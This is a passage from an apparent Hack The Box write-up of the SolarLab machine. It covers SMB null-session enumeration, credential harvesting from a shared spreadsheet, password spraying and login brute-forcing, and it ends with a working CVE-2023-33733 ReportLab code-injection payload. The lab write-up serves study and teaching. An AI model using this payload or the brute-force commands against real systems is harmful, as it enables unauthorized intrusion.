+Bad SMB2 (sign_algo_id=1) signature for message
+[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
+[0000] 34 2F 8F B2 E7 8E 60 C6   7D 26 A8 C5 08 91 34 3D   4/....`. }&amp;....4=
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+# Guest session
+❯ rpcclient -U "solarlab.htb/guest%" 10.10.11.16
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_CONNECTION_DISCONNECTED
+# Random sessions
+❯ rpcclient -U "solarlab.htb/test%pjapfa" 10.10.11.16
+Bad SMB2 (sign_algo_id=1) signature for message
+[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
+[0000] BC 3B D8 73 B8 B6 23 4C   87 52 57 D0 05 3D 02 57   .;.s..#L .RW..=.W
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+❯ rpcclient -U "solarlab.htb/test%" 10.10.11.16
+Bad SMB2 (sign_algo_id=1) signature for message
+[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
+[0000] 19 5B 4D 73 37 96 0E 77   98 B3 BD 76 03 0B 0D FE   .[Ms7..w ...v....
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+❯ rpcclient -U "solarlab.htb/%pfjafpa" 10.10.11.16
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_CONNECTION_DISCONNECTED
+rpcclient $&gt; 
+</code></pre>
+
+<p>But it’s not the case.</p>
+
+<blockquote>
+  <p>Note: For rpcclient, the syntax to specify domain, username and password is <code>domain/username%password</code>. If you didn’t knew it, you could see it in the help panel with <code>rpcclient --help</code>.</p>
+</blockquote>
+    
+      <h2 id="smb">
+        
+        
+          SMB <a href="#smb" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>First, I will try to retrieve domain information with netexec (updated version of crackmapexec):</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.16
+SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
+</code></pre>
+
+<p>I can see its PC name is SOLARLAB and that it consists of a Windows 10 Server 2019 Build 19041. Nothing interesting here.</p>
+
+<p>Now I will try to see if I can access shared folders and files with a null or guest session:</p>
+
+<pre><code class="language-bash">❯ smbclient -N -L 10.10.11.16
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Documents       Disk      
+	IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.16 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+
+<p>And I can access with null session. The C$ and ADMIN$ shares are for administrators so I can’t access it.</p>
+
+<p>I will try with the “Documents” share and it works:</p>
+
+<pre><code class="language-bash">❯ smbclient -N //10.10.11.16/Documents
+Try "help" to get a list of possible commands.
+smb: \&gt; 
+</code></pre>
+
+<p>A thing to notice is that there is no write privileges on this share so any social engineering attack with a .scf or .ini is discarded:</p>
+
+<pre><code class="language-bash">❯ touch test.txt
+❯ smbclient -N //10.10.11.16/Documents
+Try "help" to get a list of possible commands.
+smb: \&gt; put test.txt
+NT_STATUS_ACCESS_DENIED opening remote file \test.txt
+❯ rm test.txt
+</code></pre>
+
+<p>And it has a lot of files there:</p>
+
+<pre><code class="language-bash">smb: \&gt; dir
+  .                                  DR        0  Fri Apr 26 16:47:14 2024
+  ..                                 DR        0  Fri Apr 26 16:47:14 2024
+  concepts                            D        0  Fri Apr 26 16:41:57 2024
+  desktop.ini                       AHS      278  Fri Nov 17 11:54:43 2023
+  details-file.xlsx                   A    12793  Fri Nov 17 13:27:21 2023
+  My Music                        DHSrn        0  Thu Nov 16 20:36:51 2023
+  My Pictures                     DHSrn        0  Thu Nov 16 20:36:51 2023
+  My Videos                       DHSrn        0  Thu Nov 16 20:36:51 2023
+  old_leave_request_form.docx         A    37194  Fri Nov 17 11:35:57 2023
+
+		7779839 blocks of size 4096. 1878858 blocks available
+</code></pre>
+
+<p>I will logout, create a folder for this shared files and transfer them there:</p>
+
+<pre><code class="language-bash">❯ mkdir smb-null
+❯ cd smb-null
+❯ smbclient -N //10.10.11.16/Documents
+Try "help" to get a list of possible commands.
+smb: \&gt; prompt off
+smb: \&gt; recurse on
+smb: \&gt; mget *
+getting file \desktop.ini of size 278 as desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
+getting file \details-file.xlsx of size 12793 as details-file.xlsx (26.5 KiloBytes/sec) (average 17.1 KiloBytes/sec)
+getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (66.2 KiloBytes/sec) (average 37.9 KiloBytes/sec)
+getting file \concepts\Training-Request-Form.docx of size 161337 as concepts/Training-Request-Form.docx (46.1 KiloBytes/sec) (average 43.9 KiloBytes/sec)
+getting file \concepts\Travel-Request-Sample.docx of size 30953 as concepts/Travel-Request-Sample.docx (26.6 KiloBytes/sec) (average 40.5 KiloBytes/sec)
+NT_STATUS_ACCESS_DENIED listing \My Music\*
+NT_STATUS_ACCESS_DENIED listing \My Pictures\*
+NT_STATUS_ACCESS_DENIED listing \My Videos\*
+</code></pre>
+
+<ul>
+  <li><code>prompt off</code>: disable prompting for all files downloaded with mget.</li>
+  <li><code>recurse on</code>: enable recursing for downloading all files inside folders.</li>
+  <li><code>mget *</code>: finally get all files (<code>*</code>) in the share.</li>
+</ul>
+
+<p>Let’s analyze the files.</p>
+    
+      <h2 id="smb-files-analysis">
+        
+        
+          SMB Files analysis <a href="#smb-files-analysis" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>The <code>desktop.ini</code> file just have info on how the folder is displayed in the “Windows Explorer” as showed <a href="https://learn.microsoft.com/en-us/windows/win32/shell/how-to-customize-folders-with-desktop-ini">here</a></p>
+
+<p>The <code>details-file.xlsx</code> file is a spreadsheet that I can open with “Libreoffice” for example. I will open it to see what is there:</p>
+
+<pre><code class="language-bash">❯ libreoffice details-file.xlsx
+</code></pre>
+
+<p>And I can see there are some usernames with passwords (nice file to share to everyone):</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240919182411.png" alt="" /></p>
+
+<p>That was interesting and I will focus on it later when I finish enumerating the files.</p>
+
+<p>There’s also a file called <code>old_leave_request_form.docx</code>, so I will open it and see what is inside:</p>
+
+<pre><code class="language-bash">❯ libreoffice old_leave_request_form.docx
+</code></pre>
+
+<p>And it has some instructions on how to send a request form for having holidays:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240919190657.png" alt="" /></p>
+
+<p>The <code>concepts</code> folder contains two files, one called <code>Training-Request-Form.docx</code> and another called <code>Travel-Request-Sample.docx</code>:</p>
+
+<pre><code class="language-bash">❯ cd concepts
+❯ ls
+Training-Request-Form.docx  Travel-Request-Sample.docx
+</code></pre>
+
+<p>The <code>Training-Request-Form.docx</code> has a form to request some type of training:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240919205721.png" alt="" /></p>
+
+<p>And the <code>Travel-Request-Sample.docx</code> has a sample email for some travel request:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240919205926.png" alt="" /></p>
+
+<p>There’s no important file left so I will focus on the passwords I saw in the .xlsx file.</p>
+    
+      <h2 id="password-spraying">
+        
+        
+          Password spraying <a href="#password-spraying" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I will create a file with a list of those usernames and another with a list of those passwords of the xlsx file I saw, which would remain like this:</p>
+
+<pre><code class="language-bash">❯ cat passwords.txt
+al;ksdhfewoiuh
+dkjafblkjadsfgl
+d398sadsknr390
+ThisCanB3typedeasily1@
+danenacia9234n
+dadsfawe9dafkn
+❯ cat users.txt
+alexander.knight
+blake.byte
+KAlexander
+ClaudiaS
+</code></pre>
+
+<p>Now, with netexec, I will bruteforce each username with all that passwords to see if they are reused in smb:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.16 -u=users.txt -p=passwords.txt --continue-on-success
+SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
+SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\alexander.knight:al;ksdhfewoiuh 
+SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake.byte:al;ksdhfewoiuh 
+SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\KAlexander:al;ksdhfewoiuh 
+SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\ClaudiaS:al;ksdhfewoiuh
+</code></pre>
+
+<blockquote>
+  <p>Note: the <code>--continue-on-success</code> flag is for netexec to not stop when a password success</p>
+</blockquote>
+
+<p>They all work because the null session enabled, so I will bruteforce it manually using bash and output it into a file called <code>bruteforce-output.txt</code>:</p>
+
+<pre><code class="language-bash">❯ for user in $(cat users.txt); do for password in $(cat passwords.txt);do echo "\n\n[+] Trying with user $user and password $password\n";(smbclient -U "solarlab.htb/$user%$password" -L 10.10.11.16 2&gt;/dev/null)done;done | tee bruteforce-output.txt
+</code></pre>
+
+<p>Now I will filter the lines containing <code>Trying with user</code> and sort the output to see if there is any new share folder, but is not the case:</p>
+
+<pre><code class="language-bash">❯ cat bruteforce-output.txt | grep -v 'Trying with user' | sort -u
+
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Documents       Disk      
+	IPC$            IPC       Remote IPC
+	Sharename       Type      Comment
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+
+<p>So I will look for other things.</p>
+    
+      <h1 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-80">
+        
+        
+          Port 80 <a href="#port-80" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Taking a look at the headers with curl I can see it redirects to solarlab.htb (as saw with nmap):</p>
+
+<pre><code class="language-bash">❯ curl -i http://10.10.11.16
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.24.0
+Date: Thu, 19 Sep 2024 19:14:52 GMT
+Content-Type: text/html
+Content-Length: 169
+Connection: keep-alive
+Location: http://solarlab.htb/
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.24.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>So I will look at the headers and data inside <code>&lt;head&gt;</code> tags in that domain with curl again:</p>
+
+<pre><code class="language-bash">❯ curl -i -s http://solarlab.htb/ | sed -n '/HTTP\/1.1/,/&lt;\/head&gt;/p'
+HTTP/1.1 200 OK
+Server: nginx/1.24.0
+Date: Thu, 19 Sep 2024 19:18:05 GMT
+Content-Type: text/html
+Content-Length: 16210
+Last-Modified: Tue, 30 Apr 2024 06:42:14 GMT
+Connection: keep-alive
+ETag: "663092c6-3f52"
+Accept-Ranges: bytes
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+	&lt;meta charset="UTF-8"&gt;
+	&lt;title&gt;SolarLab Instant Messenger&lt;/title&gt;
+	&lt;meta name="description" content="Kite Coming Soon HTML Template by Jewel Theme" &gt;
+	&lt;meta name="author" content="Jewel Theme"&gt;
+
+	&lt;!-- Mobile Specific Meta --&gt;
+	&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+	&lt;!--[if IE]&gt;&lt;meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'&gt;&lt;![endif]--&gt;
+
+	&lt;!-- Bootstrap  --&gt;
+	&lt;link href="assets/css/bootstrap.min.css" rel="stylesheet"&gt;
+
+	&lt;!-- icon fonts font Awesome --&gt;
+	&lt;link href="assets/css/font-awesome.min.css" rel="stylesheet"&gt;
+
+	&lt;!-- Custom Styles --&gt;
+	&lt;link href="assets/css/style.css" rel="stylesheet"&gt;
+
+	&lt;!--[if lt IE 9]&gt;
+	&lt;script src="assets/js/html5shiv.js"&gt;&lt;/script&gt;
+	&lt;![endif]--&gt;
+
+&lt;/head&gt;
+</code></pre>
+
+<p>I can see its something about a messenger and nothing more that I didn’t saw in the nmap scan.</p>
+
+<p>Taking a look in the browser, I can see it’s a landing page for SolarLab IM:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183404.png" alt="" /></p>
+
+<p>Also, I noticed that the users I saw before in the document appear in the “about us” section of the page:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183451.png" alt="" /></p>
+
+<p>Sending an email in the newsletter gives “Method not allowed” error:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183528.png" alt="" /></p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183539.png" alt="" /></p>
+
+<p>There’s also a contact section that makes a get request to the same page with some parameters. But it shows the same as before:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183624.png" alt="" /></p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183703.png" alt="" /></p>
+
+<p>Also, I can see that it’s a page wrote in HTML as index.html gives the same result:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183809.png" alt="" /></p>
+
+<p>Otherwise, if I put for example index.php it gives 404:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240920183851.png" alt="" /></p>
+
+<p>As it seems so static, I will look for subdomains first to see if there is something more interesting:</p>
+
+<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.solarlab.htb" -u http://solarlab.htb/ -fs 169
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://solarlab.htb/
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.solarlab.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 169
+________________________________________________
+
+:: Progress: [4989/4989] :: Job [1/1] :: 1149 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+</code></pre>
+
+<p>But there’s no other subdomain so I will look for routes in the server:</p>
+
+<pre><code class="language-plaintext">❯ feroxbuster -u http://solarlab.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php html
+                                                                                                                                                                                                          [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 101ms]
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://solarlab.htb/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        7l       11w      169c http://solarlab.htb/images =&gt; http://solarlab.htb/images/
+200      GET       25l      179w    11924c http://solarlab.htb/images/team/team-member-3.jpg
+200      GET       29l      173w    15431c http://solarlab.htb/images/team/team-member-2.jpg
+200      GET       34l      156w    10625c http://solarlab.htb/images/team/team-member-1.jpg
+200      GET      250l      545w     7532c http://solarlab.htb/assets/js/functions.js
+200      GET        8l       73w     2429c http://solarlab.htb/assets/js/html5shiv.js
+200      GET        4l       59w    20766c http://solarlab.htb/assets/css/font-awesome.min.css
+200      GET     1183l     2149w    25111c http://solarlab.htb/assets/css/style.css
+200      GET        4l      320w    15506c http://solarlab.htb/assets/js/modernizr-2.8.0.min.js
+200      GET      472l     1213w    16210c http://solarlab.htb/index.html
+200      GET      471l     1516w    87223c http://solarlab.htb/images/background/contact.jpg
+200      GET      376l     1875w    86101c http://solarlab.htb/images/background/newsletter.jpg
+200      GET      687l     3321w    67119c http://solarlab.htb/assets/js/plugins.js
+200      GET        4l     1304w    83615c http://solarlab.htb/assets/js/jquery-2.1.0.min.js
+200      GET        7l     1210w    99961c http://solarlab.htb/assets/css/bootstrap.min.css
+200      GET      731l     4418w   255443c http://solarlab.htb/images/background/about-us.jpg
+403      GET        7l        9w      153c http://solarlab.htb/assets/js/
+403      GET        7l        9w      153c http://solarlab.htb/assets/css/
+301      GET        7l       11w      169c http://solarlab.htb/assets/images =&gt; http://solarlab.htb/assets/images/
+301      GET        7l       11w      169c http://solarlab.htb/assets/css =&gt; http://solarlab.htb/assets/css/
+403      GET        7l        9w      153c http://solarlab.htb/assets/
+301      GET        7l       11w      169c http://solarlab.htb/assets/js =&gt; http://solarlab.htb/assets/js/
+403      GET        7l        9w      153c http://solarlab.htb/images/team/
+403      GET        7l        9w      153c http://solarlab.htb/images/background/
+301      GET        7l       11w      169c http://solarlab.htb/assets =&gt; http://solarlab.htb/assets/
+200      GET      472l     1213w    16210c http://solarlab.htb/
+403      GET        7l        9w      153c http://solarlab.htb/images/
+301      GET        7l       11w      169c http://solarlab.htb/assets/fonts =&gt; http://solarlab.htb/assets/fonts/
+403      GET        7l        9w      153c http://solarlab.htb/assets/images/
+403      GET        7l        9w      153c http://solarlab.htb/assets/fonts/
+301      GET        7l       11w      169c http://solarlab.htb/images/team =&gt; http://solarlab.htb/images/team/
+200      GET     6937l    43973w  3418903c http://solarlab.htb/images/background/page-top.jpg
+301      GET        7l       11w      169c http://solarlab.htb/images/background =&gt; http://solarlab.htb/images/background/
+500      GET        7l       13w      177c http://solarlab.htb/con
+500      GET        7l       13w      177c http://solarlab.htb/con.html
+500      GET        7l       13w      177c http://solarlab.htb/images/con
+500      GET        7l       13w      177c http://solarlab.htb/assets/css/con
+500      GET        7l       13w      177c http://solarlab.htb/assets/js/con
+500      GET        7l       13w      177c http://solarlab.htb/images/con.html
+500      GET        7l       13w      177c http://solarlab.htb/assets/con
+500      GET        7l       13w      177c http://solarlab.htb/images/team/con
+500      GET        7l       13w      177c http://solarlab.htb/images/background/con
+500      GET        7l       13w      177c http://solarlab.htb/assets/css/con.html
+500      GET        7l       13w      177c http://solarlab.htb/assets/js/con.html
+500      GET        7l       13w      177c http://solarlab.htb/assets/con.html
+500      GET        7l       13w      177c http://solarlab.htb/images/team/con.html
+500      GET        7l       13w      177c http://solarlab.htb/images/background/con.html
+500      GET        7l       13w      177c http://solarlab.htb/assets/images/con
+500      GET        7l       13w      177c http://solarlab.htb/assets/images/con.html
+500      GET        7l       13w      177c http://solarlab.htb/assets/fonts/con
+500      GET        7l       13w      177c http://solarlab.htb/assets/fonts/con.html
+[####################] - 3m   1033305/1033305 0s      found:51      errors:0      
+[####################] - 3m    114804/114804  764/s   http://solarlab.htb/ 
+[####################] - 3m    114804/114804  763/s   http://solarlab.htb/images/ 
+[####################] - 3m    114804/114804  764/s   http://solarlab.htb/assets/js/ 
+[####################] - 3m    114804/114804  764/s   http://solarlab.htb/images/team/ 
+[####################] - 3m    114804/114804  765/s   http://solarlab.htb/images/background/ 
+[####################] - 3m    114804/114804  763/s   http://solarlab.htb/assets/ 
+[####################] - 3m    114804/114804  764/s   http://solarlab.htb/assets/css/ 
+[####################] - 3m    114804/114804  764/s   http://solarlab.htb/assets/images/ 
+</code></pre>
+
+<blockquote>
+  <p>Note: I used the lowercase version of raft-small-words because at my first scan I saw that the routes of the server are case insensitive</p>
+</blockquote>
+
+<p>But nothing important here, an interesting thing is that all the routes with the word <code>con</code> gived 500 error.</p>
+
+<p>Now I will take a look at port 6791</p>
+    
+      <h2 id="port-6791">
+        
+        
+          Port 6791 <a href="#port-6791" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>In nmap, I saw that it redirected to report.solarlab.htb:6791, so I will look directly at this with curl:</p>
+
+<pre><code class="language-bash">❯ curl -i -s http://report.solarlab.htb:6791/ -o 6791-main-page-output.txt
+❯ less 6791-main-page-output.txt
+HTTP/1.1 200 OK
+Server: nginx/1.24.0
+Date: Sat, 21 Sep 2024 08:19:36 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2045
+Connection: keep-alive
+Vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Login - ReportHub&lt;/title&gt;
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p>And I can see its a login page to something called ReportHub.</p>
+
+<p>In the browser it looks like this:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921100621.png" alt="" /></p>
+
+<p>Intercepting the login request with burpsuite, I can see it only has two parameters that go to /login, username and password:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921100742.png" alt="" /></p>
+
+<p>When the username doesn’t exists it says “User not found”:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921101022.png" alt="" /></p>
+    
+      <h1 id="access-as-blake">
+        
+        
+          Access as blake <a href="#access-as-blake" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>I will create all the possible combinations of usernames using <code>username-anarchy</code> with the names I got before in the excel:</p>
+
+<pre><code class="language-bash">❯ cat fullnames.txt
+Alexander Knight
+Blake Byte
+Claudia Springer
+❯ /opt/username-anarchy/username-anarchy -i fullnames.txt &gt; users-to-test.txt
+</code></pre>
+
+<p>And bruteforce for valid users filtering the responses that contains the string ‘User not found’ because is what the page gives if the user is not found:</p>
+
+<pre><code class="language-bash">❯ ffuf -w users-to-test.txt -d 'username=FUZZ&amp;password=test' -X POST -u http://report.solarlab.htb:6791/login -H "Content-Type: application/x-www-form-urlencoded" -mc all -fr 'User not found.'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://report.solarlab.htb:6791/login
+ :: Wordlist         : FUZZ: /home/gabri/Desktop/HTB/machines/SolarLab-10.10.11.16/content/users-to-test.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=FUZZ&amp;password=test
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Regexp: User not found.
+________________________________________________
+
+claudias                [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 64ms]
+alexanderk              [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 108ms]
+blakeb                  [Status: 200, Size: 2144, Words: 812, Lines: 87, Duration: 114ms]
+:: Progress: [44/44] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</code></pre>
+
+<p>And I have three valid users! Let’s look for their passwords:</p>
+
+<pre><code class="language-bash">❯ cat web-valid-users.txt
+alexanderk
+claudias
+blakeb
+❯ ffuf -w web-valid-users.txt:USER -w passwords.txt:PASSWORD -enc 'PASSWORD:urlencode' -enc 'USER:urlencode' -d 'username=USER&amp;password=PASSWORD' -H "Content-Type: application/x-www-form-urlencoded" -u http://report.solarlab.htb:6791/login -fr 'User authentication error.'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://report.solarlab.htb:6791/login
+ :: Wordlist         : USER: /home/gabri/Desktop/HTB/machines/SolarLab-10.10.11.16/content/web-valid-users.txt
+ :: Wordlist         : PASSWORD: /home/gabri/Desktop/HTB/machines/SolarLab-10.10.11.16/content/passwords.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=USER&amp;password=PASSWORD
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: User authentication error.
+________________________________________________
+
+[Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 54ms]
+    * PASSWORD: ThisCanB3typedeasily1%40
+    * USER: blakeb
+
+:: Progress: [18/18] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</code></pre>
+
+<p>And I have a valid credential for reporthub! User blakeb and password <code>ThisCanB3typedeasily1@</code>. After introducing them, I can have access to the dashboard:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921110520.png" alt="" /></p>
+
+<p>It seems like a communication page for employees. All the requests have a “Generate PDF” button, let’s see how the pdf looks like by filling the form and clicking on that button. My upload signature is just a random jpg file:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921111419.png" alt="" /></p>
+
+<p>And it generates the following pdf with the information in it:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921111547.png" alt="" /></p>
+
+<p>Downloading and looking at the metadata, I can see it’s generated with “ReportLab PDF library” in the Producer header:</p>
+
+<pre><code class="language-bash">❯ exiftool leaveRequest.pdf
+ExifTool Version Number         : 12.76
+File Name                       : leaveRequest.pdf
+Directory                       : .
+File Size                       : 847 kB
+File Modification Date/Time     : 2024:09:21 11:16:16+02:00
+File Access Date/Time           : 2024:09:21 11:16:16+02:00
+File Inode Change Date/Time     : 2024:09:21 11:16:24+02:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Author                          : (anonymous)
+Create Date                     : 2024:09:21 12:14:24-02:00
+Creator                         : (unspecified)
+Modify Date                     : 2024:09:21 12:14:24-02:00
+Producer                        : ReportLab PDF Library - www.reportlab.com
+Subject                         : (unspecified)
+Title                           : (anonymous)
+Trapped                         : False
+Page Mode                       : UseNone
+Page Count                      : 1
+</code></pre>
+
+<p>Searching for exploits for this, I saw <a href="https://github.com/c53elyas/CVE-2023-33733">this</a> poc that explains so well the vulnerability. I will not detail here the vulnerability but I will look at the poc and follow that steps:</p>
+
+<p><img src="/assets/images/Solarlab/Pasted%20image%2020240921112501.png" alt="" /></p>
+
+<p>But I don’t want to generate it with xhtml2pdf, I want to generate it in the victim server so I will just create the mallicious.html file to see how the contents are:</p>
+
+<pre><code class="language-bash">❯ cat &gt;mallicious.html &lt;&lt;EOF
+&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;
+                exploit
+&lt;/font&gt;&lt;/para&gt;
+EOF
+❯ cat mallicious.html
+&lt;para&gt;&lt;font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"&gt;
+                exploit
+&lt;/font&gt;&lt;/para&gt;
+</code></pre>
+
